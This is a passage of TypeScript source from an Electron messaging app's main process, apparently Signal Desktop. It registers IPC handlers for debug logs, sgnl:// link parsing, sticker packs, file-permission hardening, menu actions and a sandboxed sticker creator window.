ipc.handle(
  'DebugLogs.getLogs',
  async (_event, data: unknown, userAgent: string) => {
    return debugLog.getLog(
      data,
      process.versions.node,
      app.getVersion(),
      os.version(),
      userAgent
    );
  }
);

ipc.handle('DebugLogs.upload', async (_event, content: string) => {
  return uploadDebugLog.upload({
    content,
    appVersion: app.getVersion(),
    logger: getLogger(),
  });
});

ipc.on('user-config-key', event => {
  // eslint-disable-next-line no-param-reassign
  event.returnValue = userConfig.get('key');
});

ipc.on('get-user-data-path', event => {
  // eslint-disable-next-line no-param-reassign
  event.returnValue = app.getPath('userData');
});

// Refresh the settings window whenever preferences change
ipc.on('preferences-changed', () => {
  for (const window of activeWindows) {
    if (window.webContents) {
      window.webContents.send('preferences-changed');
    }
  }
});

function getIncomingHref(argv: Array<string>) {
  return argv.find(arg => isSgnlHref(arg, getLogger()));
}

function getIncomingCaptchaHref(argv: Array<string>) {
  return argv.find(arg => isCaptchaHref(arg, getLogger()));
}

function handleSgnlHref(incomingHref: string) {
  let command;
  let args;
  let hash;

  if (isSgnlHref(incomingHref, getLogger())) {
    ({ command, args, hash } = parseSgnlHref(incomingHref, getLogger()));
  } else if (isSignalHttpsLink(incomingHref, getLogger())) {
    ({ command, args, hash } = parseSignalHttpsLink(incomingHref, getLogger()));
  }

  if (mainWindow && mainWindow.webContents) {
    if (command === 'addstickers') {
      getLogger().info('Opening sticker pack from sgnl protocol link');
      const packId = args?.get('pack_id');
      const packKeyHex = args?.get('pack_key');
      const packKey = packKeyHex
        ? Buffer.from(packKeyHex, 'hex').toString('base64')
        : '';
      mainWindow.webContents.send('show-sticker-pack', { packId, packKey });
    } else if (command === 'art-auth') {
      const token = args?.get('token');
      const pubKeyBase64 = args?.get('pub_key');

      mainWindow.webContents.send('authorize-art-creator', {
        token,
        pubKeyBase64,
      });
    } else if (command === 'signal.group' && hash) {
      getLogger().info('Showing group from sgnl protocol link');
      mainWindow.webContents.send('show-group-via-link', { hash });
    } else if (command === 'signal.me' && hash) {
      getLogger().info('Showing conversation from sgnl protocol link');
      mainWindow.webContents.send('show-conversation-via-signal.me', { hash });
    } else {
      getLogger().info('Showing warning that we cannot process link');
      mainWindow.webContents.send('unknown-sgnl-link');
    }
  } else {
    getLogger().error('Unhandled sgnl link');
  }
}

ipc.handle('install-sticker-pack', (_event, packId, packKeyHex) => {
  const packKey = Buffer.from(packKeyHex, 'hex').toString('base64');
  if (mainWindow) {
    mainWindow.webContents.send('install-sticker-pack', { packId, packKey });
  }
});

ipc.handle('ensure-file-permissions', () => ensureFilePermissions());

/**
 * Ensure files in the user's data directory have the proper permissions.
 * Optionally takes an array of file paths to exclusively affect.
 *
 * @param {string[]} [onlyFiles] - Only ensure permissions on these given files
 */
async function ensureFilePermissions(onlyFiles?: Array<string>) {
  getLogger().info('Begin ensuring permissions');

  const start = Date.now();
  const userDataPath = await realpath(app.getPath('userData'));
  // fast-glob uses `/` for all platforms
  const userDataGlob = normalizePath(join(userDataPath, '**', '*'));

  // Determine files to touch
  const files = onlyFiles
    ? onlyFiles.map(f => join(userDataPath, f))
    : await fastGlob(userDataGlob, {
        markDirectories: true,
        onlyFiles: false,
        ignore: ['**/Singleton*'],
      });

  getLogger().info(`Ensuring file permissions for ${files.length} files`);

  // Touch each file in a queue
  const q = new PQueue({ concurrency: 5, timeout: 1000 * 60 * 2 });
  drop(
    q.addAll(
      files.map(f => async () => {
        const isDir = f.endsWith('/');
        try {
          await chmod(normalize(f), isDir ? 0o700 : 0o600);
        } catch (error) {
          getLogger().error(
            'ensureFilePermissions: Error from chmod',
            error.message
          );
        }
      })
    )
  );

  await q.onEmpty();

  getLogger().info(`Finish ensuring permissions in ${Date.now() - start}ms`);
}

ipc.handle('get-auto-launch', async () => {
  return app.getLoginItemSettings(await getDefaultLoginItemSettings())
    .openAtLogin;
});

ipc.handle('set-auto-launch', async (_event, value) => {
  const openAtLogin = Boolean(value);
  getLogger().info('set-auto-launch: new value', openAtLogin);
  app.setLoginItemSettings({
    ...(await getDefaultLoginItemSettings()),
    openAtLogin,
  });
});

ipc.on('show-message-box', (_event, { type, message }) => {
  drop(dialog.showMessageBox({ type, message }));
});

ipc.on('show-item-in-folder', (_event, folder) => {
  shell.showItemInFolder(folder);
});

ipc.handle('show-save-dialog', async (_event, { defaultPath }) => {
  if (!mainWindow) {
    getLogger().warn('show-save-dialog: no main window');

    return { canceled: true };
  }

  const { canceled, filePath: selectedFilePath } = await dialog.showSaveDialog(
    mainWindow,
    { defaultPath }
  );

  if (canceled || selectedFilePath == null) {
    return { canceled: true };
  }

  // On Windows, if you change the path from the default, the extension is
  // removed. We want to make sure the extension is always there.
  const defaultExt = extname(defaultPath);
  const finalDirname = dirname(selectedFilePath);
  const finalBasename = basename(selectedFilePath, defaultExt);
  const finalFilePath = join(finalDirname, `${finalBasename}${defaultExt}`);

  return { canceled: false, filePath: finalFilePath };
});

ipc.handle('getScreenCaptureSources', async () => {
  return desktopCapturer.getSources({
    fetchWindowIcons: true,
    thumbnailSize: { height: 102, width: 184 },
    types: ['window', 'screen'],
  });
});

ipc.handle('executeMenuRole', async ({ sender }, untypedRole) => {
  const role = untypedRole as MenuItemConstructorOptions['role'];

  const senderWindow = BrowserWindow.fromWebContents(sender);

  switch (role) {
    case 'undo':
      sender.undo();
      break;
    case 'redo':
      sender.redo();
      break;
    case 'cut':
      sender.cut();
      break;
    case 'copy':
      sender.copy();
      break;
    case 'paste':
      sender.paste();
      break;
    case 'pasteAndMatchStyle':
      sender.pasteAndMatchStyle();
      break;
    case 'delete':
      sender.delete();
      break;
    case 'selectAll':
      sender.selectAll();
      break;
    case 'reload':
      sender.reload();
      break;
    case 'toggleDevTools':
      sender.toggleDevTools();
      break;

    case 'resetZoom':
      sender.setZoomLevel(0);
      break;
    case 'zoomIn':
      sender.setZoomLevel(sender.getZoomLevel() + 1);
      break;
    case 'zoomOut':
      sender.setZoomLevel(sender.getZoomLevel() - 1);
      break;

    case 'togglefullscreen':
      senderWindow?.setFullScreen(!senderWindow?.isFullScreen());
      break;
    case 'minimize':
      senderWindow?.minimize();
      break;
    case 'close':
      senderWindow?.close();
      break;

    case 'quit':
      app.quit();
      break;

    default:
      // ignored
      break;
  }
});

ipc.handle('getMainWindowStats', async () => {
  return {
    isMaximized: windowConfig?.maximized ?? false,
    isFullScreen: windowConfig?.fullscreen ?? false,
  };
});

ipc.handle('getMenuOptions', async () => {
  return {
    development: menuOptions?.development ?? false,
    devTools: menuOptions?.devTools ?? false,
    includeSetup: menuOptions?.includeSetup ?? false,
    isProduction: menuOptions?.isProduction ?? true,
    platform: menuOptions?.platform ?? 'unknown',
  };
});

ipc.handle('executeMenuAction', async (_event, action: MenuActionType) => {
  if (action === 'forceUpdate') {
    drop(forceUpdate());
  } else if (action === 'openArtCreator') {
    drop(openArtCreator());
  } else if (action === 'openContactUs') {
    openContactUs();
  } else if (action === 'openForums') {
    openForums();
  } else if (action === 'openJoinTheBeta') {
    openJoinTheBeta();
  } else if (action === 'openReleaseNotes') {
    openReleaseNotes();
  } else if (action === 'openSupportPage') {
    openSupportPage();
  } else if (action === 'setupAsNewDevice') {
    setupAsNewDevice();
  } else if (action === 'setupAsStandalone') {
    setupAsStandalone();
  } else if (action === 'showAbout') {
    drop(showAbout());
  } else if (action === 'showDebugLog') {
    drop(showDebugLogWindow());
  } else if (action === 'showKeyboardShortcuts') {
    showKeyboardShortcuts();
  } else if (action === 'showSettings') {
    drop(showSettingsWindow());
  } else if (action === 'showWindow') {
    showWindow();
  } else {
    throw missingCaseError(action);
  }
});

ipc.handle(
  'net.resolveHost',
  (_event, hostname: string, queryType?: 'A' | 'AAAA') => {
    return net.resolveHost(hostname, {
      queryType,
    });
  }
);

let stickerCreatorWindow: BrowserWindow | undefined;
async function showStickerCreatorWindow() {
  if (stickerCreatorWindow) {
    stickerCreatorWindow.show();
    return;
  }

  const { x = 0, y = 0 } = windowConfig || {};

  const options = {
    x: x + 100,
    y: y + 100,
    width: 800,
    minWidth: 800,
    height: 815,
    minHeight: 750,
    frame: true,
    title: getResolvedMessagesLocale().i18n('icu:signalDesktopStickerCreator'),
    autoHideMenuBar: true,
    backgroundColor: await getBackgroundColor(),
    show: false,
    webPreferences: {
      ...defaultWebPrefs,
      partition: STICKER_CREATOR_PARTITION,
      nodeIntegration: false,
      nodeIntegrationInWorker: false,
      sandbox: true,
      contextIsolation: true,
      preload: join(__dirname, '../ts/windows/sticker-creator/preload.js'),
      nativeWindowOpen: true,
    },
  };

  stickerCreatorWindow = new BrowserWindow(options);

  handleCommonWindowEvents(stickerCreatorWindow);

  stickerCreatorWindow.once('ready-to-show', () => {
    stickerCreatorWindow?.show();
  });

  stickerCreatorWindow.on('closed', () => {
    stickerCreatorWindow = undefined;
  });

  await safeLoadURL(
    stickerCreatorWindow,
    await prepareFileUrl([__dirname, '../sticker-creator/dist/index.html'])
  );
}

if (isTestEnvironment(getEnvironment())) {
  ipc.handle('ci:test-electron:done', async (_event, info) => {
    if (!process.env.TEST_QUIT_ON_COMPLETE) {
      return;
    }

    process.stdout.write(
      `ci:test-electron:done=${JSON.stringify(info)}\n`,
      () => app.quit()
    );
  });
}